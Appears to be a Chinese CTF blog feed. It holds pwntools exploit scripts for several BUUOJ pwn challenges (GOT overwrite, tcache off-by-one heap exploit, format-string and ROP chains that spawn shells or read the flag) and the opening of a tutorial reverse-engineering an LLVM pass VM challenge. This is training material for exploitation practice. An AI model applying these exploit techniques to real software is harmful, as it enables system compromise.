title="buu075-picoctf_2018_got-shell"></a>buu075-picoctf_2018_got-shell</h1><p>在修改后还调用了puts函数，因此只需要将puts函数的got表内容改成win函数地址即可。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./PicoCTF_2018_got-shell&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27364</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./PicoCTF_2018_got-shell&#x27;</span>)</span><br><span class="line">target = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">value = elf.symbols[<span class="string">&#x27;win&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;value?\n&#x27;</span>, <span class="built_in">hex</span>(target)[<span class="number">2</span>:].encode())</span><br><span class="line">io.sendlineafter(<span class="built_in">hex</span>(target)[<span class="number">2</span>:].encode(), <span class="built_in">hex</span>(value)[<span class="number">2</span>:].encode())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu076-npuctf-2020-easyheap"><a href="#buu076-npuctf-2020-easyheap" class="headerlink" title="buu076-npuctf_2020_easyheap"></a>buu076-npuctf_2020_easyheap</h1><p>增删改查四个功能，其中增加只能增加大小为0x20或0x40的堆块。改功能有off by one漏洞。</p><p>本题环境是2.27，因此释放的堆块都会在tcache中保存。而要想tcache中的堆块被重新分配，其大小就必须是0x20或0x40。如果使用off by one漏洞修改一个堆块的size，则必须在其正在使用时修改，否则当堆块释放时修改大小，在重新分配时无法通过检查。至于大小的修改，有两种可能：改大或改小。</p><p>如果改大，则只能从0x20改为0x40，修改后的大小如果不为0x40，在释放后将无法被重新分配。如果改小，可以从0x40改为0x20，后面的部分由于可以控制，因此可以伪造成一个假chunk。</p><p>这里选择的是<font color=red><strong>改大</strong></font>。如何改？首先想象这样的堆排布：三个0x20的chunk，前面2个都是用作buffer，后面一个用于heaparray结构，现在通过edit第1个chunk将第2个chunk的大小改成0x40，再释放第2、3个chunk，就会产生chunk重叠，之后再重新分配回来，就可以通过edit随意修改heaparray中的指针，进而实现任意地址写。本题中最方便的就是改到free的got表位置，通过show获取libc地址，然后将这里的值改成system函数地址，直接delete即可get shell。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&quot;npuctf_2020_easyheap&quot;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29065</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;npuctf_2020_easyheap&quot;</span>)</span><br><span class="line"></span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_heap</span>(<span class="params">size, content</span>):</span><br><span class="line">sla(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Size of Heap(0x10 or 0x20 only) : &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">sla(<span class="string">b&#x27;Content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_heap</span>(<span class="params">index, content</span>):</span><br><span class="line">sla(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">sla(<span class="string">b&#x27;Content: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show_heap</span>(<span class="params">index</span>):</span><br><span class="line">sla(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete_heap</span>(<span class="params">index</span>):</span><br><span class="line">sla(<span class="string">b&#x27;Your choice :&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;Index :&#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">create_heap(<span class="number">0x18</span>, cyclic(<span class="number">0x38</span>))<span class="comment"># 0</span></span><br><span class="line">create_heap(<span class="number">0x18</span>, cyclic(<span class="number">0x18</span>))<span class="comment"># 1</span></span><br><span class="line">create_heap(<span class="number">0x18</span>, cyclic(<span class="number">0x18</span>))<span class="comment"># 2</span></span><br><span class="line">delete_heap(<span class="number">0</span>)</span><br><span class="line">edit_heap(<span class="number">1</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p8(<span class="number">0x41</span>))</span><br><span class="line">delete_heap(<span class="number">2</span>)</span><br><span class="line">create_heap(<span class="number">0x38</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>.ljust(<span class="number">0x18</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0x21</span>) + p64(<span class="number">0x38</span>) + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]))</span><br><span class="line">show_heap(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Content : &#x27;</span>)</span><br><span class="line">free = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>, free)</span><br><span class="line">base = free - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">system = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">edit_heap(<span class="number">0</span>, p64(system))</span><br><span class="line">delete_heap(<span class="number">1</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu077-wdb-2018-2nd-easyfmt"><a href="#buu077-wdb-2018-2nd-easyfmt" class="headerlink" title="buu077-wdb_2018_2nd_easyfmt"></a>buu077-wdb_2018_2nd_easyfmt</h1><p>这题在bugku上也有，好像是叫pwn07，简单的格式化字符串漏洞，不多解释了。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29596</span>)</span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Do you know repeater?\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload1 = p32(elf.got[<span class="string">&#x27;read&#x27;</span>]) + <span class="string">b&#x27;%6$s&#x27;</span></span><br><span class="line">io.send(payload1)</span><br><span class="line"></span><br><span class="line">mem_read_addr = u32(io.recv()[<span class="number">4</span>:<span class="number">8</span>])</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;read&#x27;</span>, mem_read_addr)</span><br><span class="line">libc_base = mem_read_addr - libc.dump(<span class="string">&#x27;read&#x27;</span>)</span><br><span class="line">mem_sys_addr = libc_base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">mem_printf_addr = libc_base + libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2 = fmtstr_payload(<span class="number">6</span>, &#123;elf.got[<span class="string">&#x27;printf&#x27;</span>]: mem_sys_addr&#125;, write_size = <span class="string">&#x27;byte&#x27;</span>)</span><br><span class="line">io.send(payload2)</span><br><span class="line">io.interactive()<span class="comment"># choose 3rd of libc</span></span><br></pre></td></tr></table></figure><h1 id="buu078-PicoCTF-2018-can-you-gets-me"><a href="#buu078-PicoCTF-2018-can-you-gets-me" class="headerlink" title="buu078-PicoCTF_2018_can-you-gets-me"></a>buu078-PicoCTF_2018_can-you-gets-me</h1><p>静态编译的32位程序，没有system函数和字符串&#x2F;bin&#x2F;sh，因此通过orw方式读取flag。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./PicoCTF_2018_can-you-gets-me&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27340</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./PicoCTF_2018_can-you-gets-me&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop4 = <span class="number">0x809d6f4</span></span><br><span class="line">write_addr = <span class="number">0x80EBD20</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x18</span> + <span class="number">4</span>)</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p32(pop4)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(write_addr)</span><br><span class="line">payload += p32(<span class="number">5</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">payload += p32(pop4)</span><br><span class="line">payload += p32(write_addr)</span><br><span class="line">payload += p32(<span class="number">0</span>) * <span class="number">3</span></span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">payload += p32(pop4)</span><br><span class="line">payload += p32(<span class="number">3</span>)</span><br><span class="line">payload += p32(write_addr)</span><br><span class="line">payload += p32(<span class="number">0x30</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(write_addr)</span><br><span class="line">payload += p32(<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;GIVE ME YOUR NAME!&#x27;</span>, payload)</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/flag&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="buu079-mrctf2020-easy-equation"><a href="#buu079-mrctf2020-easy-equation" class="headerlink" title="buu079-mrctf2020_easy_equation"></a>buu079-mrctf2020_easy_equation</h1><p>简单的格式化字符串漏洞。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">sol = <span class="number">2</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./mrctf2020_easy_equation&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25629</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./mrctf2020_easy_equation&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line"><span class="comment"># time.sleep(3)</span></span><br><span class="line">payload = <span class="string">b&#x27;a%1c%10$hhnaaaaba&#x27;</span> + p64(<span class="number">0x60105C</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>LLVM pass pwn 入门 (3)</title>
      <link href="/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-3/"/>
      <url>/2023/02/28/LLVM-pass-pwn-%E5%85%A5%E9%97%A8-3/</url>
      
        <content type="html"><![CDATA[<p>这篇文章中我们来分析一下红帽杯2021-simpleVM这道题，由于和上一道题相比这道题相对更加简单些，读者可以在阅读本文之前实操一下，遇到困难时再通过本文找到答案，这样能够更好地提升我们的做题实践能力。（本题的附件可以在Github上找到，在笔者的Github中也有保存）</p><h1 id="RedHat2021-simpleVM"><a href="#RedHat2021-simpleVM" class="headerlink" title="RedHat2021-simpleVM"></a>RedHat2021-simpleVM</h1><p>首先还是使用IDA打开，找到了几个没有名字的函数：</p><p><img src="https://img-blog.csdnimg.cn/0c7e9c0c6ac549738b41f87f51f64e3e.png"></p><h2 id="Step-1-找到runOnFunction函数"><a href="#Step-1-找到runOnFunction函数" class="headerlink" title="Step 1: 找到runOnFunction函数"></a>Step 1: 找到runOnFunction函数</h2><p>如果读者还记得上一篇文章的方法，这一步应该来说不难想到。我们是通过IDA汇编界面中对函数的交叉引用情况进行判断的，如果这个函数没有数据段的交叉引用，那么它一定不是runOnFunction函数，因为这是一个覆写的函数，其地址会被保存到vtable结构体中。根据这种方法，我们可以找到多个函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000006780 sub_6780        proc near               ; CODE XREF: sub_67D0+24↓p</span><br><span class="line">LOAD:0000000000006780                                         ; DATA XREF: LOAD:off_20DD20↓o</span><br><span class="line">...</span><br><span class="line">LOAD:00000000000067D0 sub_67D0        proc near               ; DATA XREF: LOAD:000000000020DD28↓o</span><br><span class="line">...</span><br><span class="line">LOAD:0000000000006830 sub_6830        proc near               ; DATA XREF: LOAD:000000000020DDA8↓o</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/8de573125adf477486aa95b64d9936c6.png"><br><img src="https://img-blog.csdnimg.cn/680a75cf30a44934a00f56d372fa1c15.png"><br>其中我们打开前两个函数，发现都是一些删除和调用析构函数的操作，因此这一定不是runOnFunction函数的覆写。故runOnFunction应该是sub_6830函数。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">runOnFunction</span><span class="params">(__int64 a1, llvm::Value *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">bool</span> v4; <span class="comment">// [rsp+7h] [rbp-119h]</span></span><br><span class="line">  <span class="type">size_t</span> v5; <span class="comment">// [rsp+10h] [rbp-110h]</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *Name; <span class="comment">// [rsp+28h] [rbp-F8h]</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+30h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+94h] [rbp-8Ch]</span></span><br><span class="line"></span><br><span class="line">  Name = (<span class="type">const</span> <span class="type">void</span> *)llvm::Value::<span class="built_in">getName</span>(a2);</span><br><span class="line">  v7 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="string">&quot;o0o0o0o0&quot;</span> )</span><br><span class="line">    v5 = <span class="built_in">strlen</span>(<span class="string">&quot;o0o0o0o0&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="number">0LL</span>;</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v7 == v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">      v8 = <span class="built_in">memcmp</span>(Name, <span class="string">&quot;o0o0o0o0&quot;</span>, v5);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      v8 = <span class="number">0</span>;</span><br><span class="line">    v4 = v8 == <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="built_in">sub_6AC0</span>(a1, a2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Step-2-分析runOnFunction函数"><a href="#Step-2-分析runOnFunction函数" class="headerlink" title="Step 2: 分析runOnFunction函数"></a>Step 2: 分析runOnFunction函数</h2><p>上面的代码就是反汇编出来的runOnFunction函数，和上一篇文章国赛题眼花缭乱的代码段相比，还是友好了不少的，代码的逻辑清晰可见。</p><p>首先使用了getName函数获取了Value对象的名字，这里其遍历的是函数名，笔者分享一种看代码的方法：从后往前，执果索因。我们可以看到最后三行是如果v4不等于0就执行sub_6AC0函数，否则就返回。在runOnFunction函数中我们没有发现任何有关于内存空间改动的函数，只有一个strlen和memcmp函数用于进行内存操作，但这两个函数都并不会对内存中对应地址的值产生任何变化。因此漏洞点一定不在runOnFunction函数，需要执行到sub_6A70函数。那也就意味着v4不能等于0。前面的代码中，唯一能让v4可能不等于0的语句就是<code>v4=v8==0</code>。注意这条语句的意思是如果<code>v8==0</code>那么v4&#x3D;1。看一下汇编代码就可以知道：<br><img src="https://img-blog.csdnimg.cn/3eb8402ac80148a8b744564000db10b2.png"><br>这里使用了一个setz指令，它的含义是当标志寄存器中的ZF位为1时，将al的值设为1。因此，我们需要让<code>v8==0</code>才行。不难发现，<code>v8==0</code>的条件就是函数名等于”o0o0o0o0”。因此这个LLVM pass只会对名为”o0o0o0o0”的函数进行一些操作。我们再来到sub_6A70函数看一下执行了什么操作。</p><h2 id="Step-3-分析sub-6AC0函数"><a href="#Step-3-分析sub-6AC0函数" class="headerlink" title="Step 3: 分析sub_6AC0函数"></a>Step 3: 分析sub_6AC0函数</h2><p>下面就是sub_6AC0函数的内容：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">sub_6AC0</span><span class="params">(__int64 a1, llvm::Function *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  llvm::BasicBlock *v3; <span class="comment">// [rsp+20h] [rbp-30h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+38h] [rbp-18h] BYREF</span></span><br><span class="line">  __int64 v5[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-10h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v5[<span class="number">1</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v5[<span class="number">0</span>] = llvm::Function::<span class="built_in">begin</span>(a2);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = llvm::Function::<span class="built_in">end</span>(a2);</span><br><span class="line">    <span class="keyword">if</span> ( (llvm::<span class="keyword">operator</span>!=(v5, &amp;v4) &amp; <span class="number">1</span>) == <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>*(v5);</span><br><span class="line">    <span class="built_in">sub_6B80</span>(a1, v3);</span><br><span class="line">    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,<span class="literal">false</span>,<span class="literal">false</span>,<span class="type">void</span>&gt;,<span class="literal">false</span>,<span class="literal">false</span>&gt;::<span class="keyword">operator</span>++(</span><br><span class="line">      v5,</span><br><span class="line">      <span class="number">0LL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>llvm::Function::begin</code>和<code>llvm::Function::end</code>都是Function类的迭代器对象，其迭代的对象是函数中的基本块。因此这个循环的意思就是对每一个基本块执行sub_6B80函数。其中<code>v3 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,false&gt;::operator*(v5);</code>这条语句中的<code>ilist</code>是LLVM标准库中定义的一个数据结构，与C++标准模板库list类似，但是LLVM中都是使用ilist来存储一个函数的所有基本块或指令，可以将其看成一个列表，针对于LLVM做了一些特殊的优化。那么v3也就是函数中的每一个基本块。我们需要进入sub_6B80函数看一下对这些基本块又进行了什么操作。</p><h2 id="Step-4-分析sub-6B80函数"><a href="#Step-4-分析sub-6B80函数" class="headerlink" title="Step 4: 分析sub_6B80函数"></a>Step 4: 分析sub_6B80函数</h2><p>这个函数是主要操作，比较长，我们一点点来看。</p><h3 id="Segment-1"><a href="#Segment-1" class="headerlink" title="Segment 1"></a>Segment 1</h3><p><img src="https://img-blog.csdnimg.cn/71a8ddbb33a64a5baffa6290b139980c.png"><br>这一段中可以看到，使用了一个大循环，是对基本块进行遍历。这里的v36变量是从v39变量dyn_cast过来的，这是一个llvm定义的类型转换，不用去管。这里是将v36转换成了Instruction指令对象，然后获取了这个指令的指令码<code>getOpcode(v36)</code>。这个指令码的定义笔者找资料找了好久都没有找到，最终查看源码才发现其定义保存在<code>llvm/IR/Instruction.def</code>文件中，上面的代码意思是指令码需要为55才能进入下一步操作，否则就会直接跳过这个指令去处理下一条指令。我们看一下<code>llvm/IR/Instruction.def</code>文件中哪个指令的指令码是55：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLE_OTHER_INST(55, Call, CallInst)</span><br></pre></td></tr></table></figure><p>即Call指令的指令码为55。如果查看上一篇文章中生成的.ll文件就可以发现，函数调用就是用Call指令来表示的。也即o0o0o0o0函数中的所有代码都要是函数调用，其他的代码写了也不会处理。</p><p>由此我们可以猜测出v35变量的CallBase指针类型实际上也就是函数调用的对象。源码中的注释说，<code>CallBase</code>对象是所有可以调用的指令的基类，这里“可以调用的指令”包含<code>InvokeInst</code>和<code>CallInst</code>。所有调用的指令都含有：调用的函数自身、零或若干个参数、<font color=blue>零或若干个操作数组以及零或若干个操作数输入 <strong>（原文是operand bundle，笔者不确定这里指的是不是数组的意思，如有错误还请读者指正）</strong></font></p><p>下面的<code>getCalledFunction</code>就是获取函数本身，将函数名拷贝到了变量s1中，下面判断函数名是否是pop，如果是判断<code>getNumOperands()</code>函数的结果是不是2。这里需要注意的是，<code>getNumOperands()</code>函数并不是返回函数参数的个数，而是返回一条指令中的变量个数。注意这里的v35变量类型是<strong>CallBase</strong>，是指令<strong>Instructions</strong>的子类，与CalledFunction变量的类型完全不同。随便截取一段.ll文件的代码可以看到call后面会跟上变量名，变量名之前加上@符号说明llvm将其认为是一个变量。因此在这里其实际返回的值应该是函数参数的个数+1。</p><p><img src="https://img-blog.csdnimg.cn/6ab8b6a9bb5345c7952c7b0251a30316.png"></p><h3 id="Segmant-2"><a href="#Segmant-2" class="headerlink" title="Segmant 2"></a>Segmant 2</h3><p>之后我们进入分析当函数名为pop时进行了何种处理。后面的一些变量笔者重命名了一下，读者可以自己打开IDA对照一下。</p><p><img src="https://img-blog.csdnimg.cn/fa11fb67d190402ea29f284922e47477.png"><br>pop函数的参数个数应该是1。之后进入内部调用了<code>getArgOperand</code>函数，这个函数是用来返回被调用的函数的第一个<strong>实参</strong>的值，然后v31变量赋值为这个值，并以<code>ConstantInt</code>即整型常量的类型保存。如果这个值不为0，那么再次进行转换，<code>getZExtValue</code>这个函数我们在上一篇文章中见过类似的函数，通过函数名猜测其功能：get Zero Extended Value，即无符号扩展整数。其为1或2时v32变量指向两段内存的地址，这两段内存分别被命名为reg1和reg2。后面又将v3变量赋值为某段内存的二重指针（因为stackdoubleptr变量保存的是一个指针指向内存空间，因此这里表示其为二重指针）。那一段内存空间被命名为stack。hmmm，这样看起来程序中有一个小的vm，有虚拟出来的寄存器和栈，算是和vm题很像了。而且这里的操作也和汇编的pop指令完全相同，将栈顶的值赋值给reg1或reg2，然后栈指针下移8。因此这个vm中栈底在低地址，而栈顶在高地址，与汇编中的栈排列相反。</p><p>现在我们知道了这里可能是一个vm，那么分析后面的条件判断就会快上很多了。</p><h3 id="Segment-3"><a href="#Segment-3" class="headerlink" title="Segment 3"></a>Segment 3</h3><p><img 